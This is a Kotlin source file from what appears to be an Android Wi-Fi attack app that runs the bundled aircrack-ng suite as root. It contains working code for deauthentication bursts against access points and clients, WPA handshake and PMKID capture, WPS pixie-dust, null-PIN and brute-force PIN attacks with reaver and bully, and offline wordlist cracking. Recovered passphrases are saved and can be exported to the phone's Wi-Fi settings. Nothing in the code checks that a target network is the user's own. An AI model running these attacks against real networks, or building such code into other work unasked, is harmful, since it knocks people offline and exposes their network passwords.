/*
 * Copyright 2026 Varakumar.
 *
 * This file is part of GhostWire.
 *
 * GhostWire is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * GhostWire is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with GhostWire.  If not, see <https://www.gnu.org/licenses/>.
 */

package org.ghostwire

import android.content.Context
import java.io.File

/**
 * The aircrack-ng suite, bundled and run as root — self-contained, no Kali
 * chroot or NetHunter needed.
 *
 * The binaries in assets/wifi/bin are statically-linked aarch64 Android
 * executables (built with the NDK; see assets/wifi/SOURCE), so they need no
 * shared libraries. They are copied to the app's files dir and chmod'd 755 on
 * first use, then exec'd as root with the capture dir as cwd. Monitor mode and
 * con_mode are handled Android-side in [WifiIface]; only the capture/attack
 * tools go through here.
 *
 * Attack command flags mirror wifite2's (GPLv2 — flags are facts about the
 * tools, reimplemented, not ported).
 */
class WifiTools(context: Context) {

    private val base = File(context.filesDir, "wifi")
    private val binDir = File(base, "bin")
    private val assets = context.assets

    /** Capture dir airodump/hcx write to and we read back (as root). */
    val workDir: String = File(base, "work").apply { mkdirs() }.absolutePath

    var installed: Boolean = false
        private set

    private val core = listOf("airodump-ng", "aireplay-ng", "aircrack-ng", "iw")

    /** Extract + chmod the bundled binaries. Idempotent, cheap to rerun. */
    fun ensure(): Boolean {
        binDir.mkdirs()
        val names = runCatching { assets.list("wifi/bin") }.getOrNull().orEmpty()
        for (n in names) {
            if (n == "SOURCE") continue
            val out = File(binDir, n)
            if (out.exists() && out.length() > 0) continue
            runCatching { assets.open("wifi/bin/$n").use { it.copyTo(out.outputStream()) } }
        }
        Root.run("chmod 755 ${binDir.absolutePath}/* 2>/dev/null")
        installed = core.all { File(binDir, it).exists() }
        return installed
    }

    fun path(tool: String): String = File(binDir, tool).absolutePath
    fun hasTool(tool: String): Boolean = File(binDir, tool).exists()

    /** Bundled wordlist for offline cracking, extracted on first use. Replaceable. */
    val wordlist: String by lazy {
        val f = File(base, "wordlist.txt")
        if (!f.exists() || f.length() == 0L)
            runCatching { assets.open("wifi/wordlist.txt").use { o -> f.outputStream().use { o.copyTo(it) } } }
        f.absolutePath
    }

    /**
     * Run "tool args …" as root with cwd = capture dir. [bg] launches it detached
     * (airodump) and returns at once.
     */
    fun exec(toolLine: String, bg: Boolean = false): String {
        val line = "${binDir.absolutePath}/$toolLine"
        // Most tools are static, but a few (aircrack-ng) are dynamically linked against the
        // bundled libc++_shared.so — point the loader at the bin dir for all of them.
        val env = "export LD_LIBRARY_PATH=${binDir.absolutePath}:\$LD_LIBRARY_PATH; "
        val body = "cd $workDir && $env" + (if (bg) "setsid $line >/dev/null 2>&1 </dev/null &" else line)
        return Root.run(body).out
    }

    /** Newest capture-dir file matching a glob ("" if none). */
    fun newest(glob: String): String =
        Root.run("ls -1t $workDir/$glob 2>/dev/null | head -n 1").out.trim()

    fun report(): String {
        val all = core + listOf("reaver", "wash", "bully", "pixiewps", "hcxdumptool", "hcxpcapngtool")
        return all.joinToString("\n") { "  ${if (hasTool(it)) "✓" else "·"} $it" }
    }

    // ---- streaming output -----------------------------------------------------

    /** Absolute path of a scratch log in the capture dir (for live tailing from the UI). */
    fun workFile(name: String): String = "$workDir/$name"

    /** Current contents of a work file, for the output view to poll. */
    fun readFile(abs: String): String = Root.run("cat '$abs' 2>/dev/null").out

    /** Append a line of our own progress text to a work log (handshake capture narrates here). */
    fun appendLog(abs: String, text: String) {
        Root.run("printf '%s' ${shellQuote(text)} >> '$abs' 2>/dev/null")
    }

    private fun shellQuote(s: String): String = "'" + s.replace("'", "'\\''") + "'"

    /**
     * Run [cmd] (built with absolute tool paths) as root with cwd = capture dir. When
     * [outAbs] is given, the combined stdout+stderr is teed there (truncated first) so the
     * UI can tail it live. Blocks until the tool exits; returns the full output.
     */
    private fun runAttack(cmd: String, outAbs: String?): String {
        val env = "export LD_LIBRARY_PATH=${binDir.absolutePath}:\$LD_LIBRARY_PATH; "
        // Append (not truncate) so a sequence can stream several sub-attacks into one log;
        // single-attack callers clear the log once before starting.
        val body = if (outAbs != null)
            "cd $workDir && $env$cmd >> '$outAbs' 2>&1; cat '$outAbs'"
        else "cd $workDir && $env$cmd 2>&1"
        return Root.run(body).out
    }

    // ---- attacks (wifite2 flags) ----------------------------------------------

    /** Targeted deauth: n bursts at an AP, optionally one client. Streams to [out]. */
    fun deauth(iface: String, bssid: String, client: String?, bursts: Int = 5, out: String? = null): String {
        if (!WifiIface.valid(iface) || !bssid.matches(MAC)) return "invalid target"
        val c = client?.takeIf { it.matches(MAC) }?.let { "-c $it" } ?: ""
        return runAttack("${path("aireplay-ng")} -0 $bursts --ignore-negative-one -a $bssid -D $c $iface", out)
    }

    /**
     * Offline crack of a captured handshake against a wordlist with aircrack-ng. Streams
     * progress to [out]; returns the recovered key or a not-found note.
     */
    fun crack(capPath: String, bssid: String, wordlist: String, out: String, label: String = ""): String {
        if (capPath.isBlank()) return "no capture file — grab a handshake first."
        if (!File(wordlist).exists()) return "wordlist missing: $wordlist"
        // bssid optional: with one, aircrack targets that AP; without, it tries every network
        // in the capture.
        val b = bssid.takeIf { it.matches(MAC) }?.let { "-b $it" } ?: ""
        runAttack("${path("aircrack-ng")} -w '$wordlist' $b '$capPath'", out)
        // Root.run returns "(no output)" when a command prints nothing, so test for the
        // actual marker rather than blankness.
        val keyLine = Root.run("grep -a 'KEY FOUND' '$out' 2>/dev/null | head -n1").out.trim()
        return if ("KEY FOUND" in keyLine) {
            // aircrack prints: KEY FOUND! [ the passphrase ]
            val pass = Regex("""\[\s*(.*?)\s*]""").find(keyLine)?.groupValues?.get(1).orEmpty()
            recordCracked(label.ifBlank { bssid }, bssid, pass, capPath.substringAfterLast('/'))
            "KEY FOUND: $pass"
        } else "Key not found in wordlist. Capture clean? Try a bigger list."
    }

    /**
     * Confirm a WPA handshake in [capPath] for [bssid] via hcxpcapngtool producing
     * a WPA*02/03/04 line. null = hcxpcapngtool not bundled (so no false positive).
     */
    fun hasHandshake(capPath: String, bssid: String): Boolean? {
        if (capPath.isBlank()) return false
        if (!hasTool("hcxpcapngtool")) return null
        exec("hcxpcapngtool -o hs.22000 '$capPath' 2>/dev/null")
        val hit = Root.run("grep -ci '^WPA\\*0[234]\\*' '$workDir/hs.22000' 2>/dev/null").out
            .trim().toIntOrNull() ?: 0
        return hit > 0
    }

    /**
     * PMKID capture: hcxdumptool for up to [secs], then hcxpcapngtool. A 22000
     * hash file lands in the capture dir on success.
     */
    fun pmkid(iface: String, bssid: String, channel: Int, secs: Int = 30, out: String? = null): String {
        if (!hasTool("hcxpcapngtool")) return "hcxpcapngtool not installed."
        if (!bssid.matches(MAC)) return "invalid bssid"
        // The bundled hcxdumptool is broken on A14 bionic (TLS segment underaligned, won't
        // load), so PMKID is captured with airodump instead: the PMKID rides in the AP's
        // first EAPOL/association message, so airodump on the AP plus a deauth burst to force
        // a client to reassociate exposes it; hcxpcapngtool then extracts the WPA*01 line.
        val ch = channel.takeIf { it > 0 }?.let { "-c $it" } ?: "--band abg"
        exec("rm -f pm-*.cap pm-*.csv pm-*.kismet* pmkid.22000 2>/dev/null")
        exec("airodump-ng $iface $ch --bssid $bssid -w pm --write-interval 1 --output-format pcap,csv", bg = true)
        // Stream the deauth nudges + wait into the log so the UI shows progress.
        runAttack(
            "sleep 3; for i in 1 2 3; do ${path("aireplay-ng")} -0 4 --ignore-negative-one " +
                "-a $bssid $iface; sleep $secs; done", out
        )
        exec("pkill -f 'airodump-ng $iface .*-w pm' 2>/dev/null")
        val cap = newest("pm-*.cap")
        if (cap.isNotBlank()) exec("hcxpcapngtool -o pmkid.22000 '$cap' 2>/dev/null")
        val b = bssid.replace(":", "").lowercase()
        val hit = Root.run("grep -i '$b' '$workDir/pmkid.22000' 2>/dev/null | grep -c '^WPA\\*01'")
            .out.trim().toIntOrNull() ?: 0
        return if (hit > 0) "PMKID captured ✓ — $workDir/pmkid.22000 (crack with hashcat -m 22000)"
        else "No PMKID in ${secs}s (AP may not expose one, or no client reassociated)."
    }

    /**
     * WPS pixie-dust / PIN with reaver (or bully). Runs up to [secs]; returns the
     * tool's own PIN/PSK result lines or a timeout note.
     */
    fun wps(iface: String, bssid: String, channel: Int, pixie: Boolean, secs: Int = 120, out: String? = null): String {
        if (!bssid.matches(MAC)) return "invalid bssid"
        if (!hasTool("reaver")) return "reaver not installed."
        val ch = channel.takeIf { it > 0 }?.let { "-c $it" } ?: ""
        val k = if (pixie) "-K" else ""
        // -F (--ignore-fcs): the qcacld internal monitor stamps a (false) bad-FCS flag on
        // every frame, which reaver otherwise drops ("bad FCS, skipping") so it never sees a
        // beacon. Ignoring it makes reaver work on the internal radio, not just an OTG one.
        val full = runAttack("timeout $secs ${path("reaver")} -i $iface -b $bssid $ch -vv -N -F $k", out)
        return summariseReaver(full, secs)
    }

    /**
     * WPS null-PIN attack (reaver `-p ''`): some APs accept an empty PIN and leak the PSK.
     * A fast, low-noise check worth trying before a full PIN brute. Streams to [out].
     */
    fun wpsNull(iface: String, bssid: String, channel: Int, secs: Int = 60, out: String? = null): String {
        if (!bssid.matches(MAC)) return "invalid bssid"
        if (!hasTool("reaver")) return "reaver not installed."
        val ch = channel.takeIf { it > 0 }?.let { "-c $it" } ?: ""
        // -F: ignore the internal monitor's false bad-FCS flag (see wps()).
        val full = runAttack("timeout $secs ${path("reaver")} -i $iface -b $bssid $ch -vv -N -F -p ''", out)
        return summariseReaver(full, secs)
    }

    private fun summariseReaver(full: String, secs: Int): String =
        full.lineSequence()
            .filter { Regex("WPS PIN|WPA PSK|pixie|locked|rate limit|not found|empty pin", RegexOption.IGNORE_CASE).containsMatchIn(it) }
            .toList().takeLast(20).joinToString("\n")
            .ifBlank { "reaver ran up to ${secs}s, no PIN/PSK recovered." }

    /** A WPS-capable AP as reported by wash. */
    data class WpsAp(val bssid: String, val channel: Int, val locked: Boolean, val version: String)

    /**
     * Passive WPS discovery with wash: hops the band (or stays on [channel]) and lists APs
     * advertising WPS plus their lock state. `-F` ignores the false bad-FCS flag the qcacld
     * internal monitor stamps on every frame, so this works on the internal radio, not only an
     * OTG adapter. Streams the raw table to [out]; returns the parsed WPS APs.
     */
    fun washScan(iface: String, channel: Int = 0, secs: Int = 30, out: String? = null): List<WpsAp> {
        if (!WifiIface.valid(iface) || !hasTool("wash")) return emptyList()
        val ch = channel.takeIf { it > 0 }?.let { "-c $it" } ?: ""
        val full = runAttack("timeout $secs ${path("wash")} -i $iface -F -a $ch", out)
        // columns: BSSID  Ch  dBm  WPS  Lck  Vendor  ESSID — a real WPS row has a version (1.0/2.0).
        val row = Regex("^\\s*([0-9A-Fa-f:]{17})\\s+(\\d+)\\s+-?\\d+\\s+(\\d\\.\\d)\\s+(Yes|No)\\b")
        return full.lineSequence().mapNotNull { line ->
            val m = row.find(line) ?: return@mapNotNull null
            WpsAp(m.groupValues[1].uppercase(), m.groupValues[2].toIntOrNull() ?: 0,
                m.groupValues[4].equals("Yes", true), m.groupValues[3])
        }.distinctBy { it.bssid }.toList()
    }

    /**
     * WPS PIN brute / pixie-dust with bully — a reaver alternative that also runs on the qcacld
     * internal monitor: `-C` skips bad-FCS validation, and because bully sets the channel over
     * the WEXT ioctl this driver doesn't support, we pre-set it with iw (nl80211) and ship a
     * bully patched to treat that ioctl failure as non-fatal. Streams to [out].
     */
    fun wpsBully(iface: String, bssid: String, channel: Int, pixie: Boolean, secs: Int = 150, out: String? = null): String {
        if (!bssid.matches(MAC)) return "invalid bssid"
        if (!hasTool("bully")) return "bully not installed."
        if (channel > 0) exec("iw dev $iface set channel $channel 2>/dev/null")
        val ch = channel.takeIf { it > 0 }?.let { "-c $it" } ?: ""
        val d = if (pixie) "-d" else ""
        // bully's -w writability check rejects the app dir's 0700 perms, so give it a 0777
        // subdir for its pin/session files.
        val bwork = "$workDir/bully"
        Root.run("mkdir -p '$bwork'; chmod 777 '$bwork'")
        val full = runAttack(
            "timeout $secs ${path("bully")} $iface -b $bssid $ch -v 3 -C -F $d -w $bwork", out)
        return full.lineSequence()
            .filter { Regex("PIN|PSK|pixie|Key|lock|cracked|found", RegexOption.IGNORE_CASE).containsMatchIn(it) }
            .toList().takeLast(20).joinToString("\n")
            .ifBlank { "bully ran up to ${secs}s, no PIN/PSK recovered." }
    }

    // ---- library: handshakes, cracked keys, wordlists, cleanup ----------------

    private val wordlistDir = File(base, "wordlists").apply { mkdirs() }
    private val crackedFile = File(base, "cracked.json")

    /** The cracked-results array ({ssid,bssid,key,cap,ts}); [] when none/unreadable. */
    private fun crackedJson(): org.json.JSONArray =
        runCatching { org.json.JSONArray(crackedFile.readText()) }.getOrDefault(org.json.JSONArray())

    /** Record a recovered key as a JSON entry (app-owned file, direct I/O). */
    fun recordCracked(ssid: String, bssid: String, key: String, cap: String) {
        val arr = crackedJson()
        arr.put(org.json.JSONObject()
            .put("ssid", ssid).put("bssid", bssid).put("key", key)
            .put("cap", cap).put("ts", System.currentTimeMillis()))
        runCatching { crackedFile.writeText(arr.toString()) }
    }

    /** (ssid, key) pairs for export to Android Wi-Fi; skips entries with no SSID/key. */
    fun crackedEntries(): List<Pair<String, String>> {
        val arr = crackedJson()
        return (0 until arr.length()).mapNotNull { i ->
            val o = arr.optJSONObject(i) ?: return@mapNotNull null
            val s = o.optString("ssid"); val k = o.optString("key")
            if (s.isNotBlank() && k.isNotBlank()) s to k else null
        }
    }

    /** Human-readable cracked list for display, or "" when none. */
    fun crackedList(): String = crackedEntries().joinToString("\n") { "${it.first}  →  ${it.second}" }

    /** Deliberate handshake capture files (hs-*.cap), newest first. */
    fun handshakes(): List<String> =
        Root.run("ls -1t $workDir/hs-*.cap 2>/dev/null").out.lineSequence()
            .map { it.trim() }.filter { it.endsWith(".cap") }.toList()

    /** Bundled wordlist plus any the user imported. */
    fun wordlists(): List<String> =
        listOf(wordlist) + (wordlistDir.listFiles()?.sorted()?.map { it.absolutePath } ?: emptyList())

    /** Save imported wordlist bytes under a sanitised [name]; returns its path. */
    fun importWordlist(name: String, bytes: ByteArray): String {
        val safe = name.replace(Regex("[^A-Za-z0-9._-]"), "_").ifBlank { "list.txt" }
        val f = File(wordlistDir, safe)
        f.writeBytes(bytes)
        return f.absolutePath
    }

    /** Kill stray tools and delete transient leftovers (scan CSVs, temp caps, logs); keeps
     *  handshakes, cracked.txt and wordlists. */
    fun cleanLeftovers(): String {
        Root.run("pkill -9 -f airodump-ng 2>/dev/null; pkill -9 -f aireplay-ng 2>/dev/null; " +
            "pkill -9 -f reaver 2>/dev/null; pkill -9 -f hcxdumptool 2>/dev/null")
        Root.run("cd $workDir && rm -f gw-*.* pm-*.* *.csv *.kismet* *.log *.netxml hs-*.csv 2>/dev/null")
        return "Killed stray capture/attack tools and removed scan/temp files. " +
            "Handshakes, cracked results and wordlists kept."
    }

    companion object {
        private val MAC = Regex("^[0-9A-Fa-f:]{17}$")
    }
}
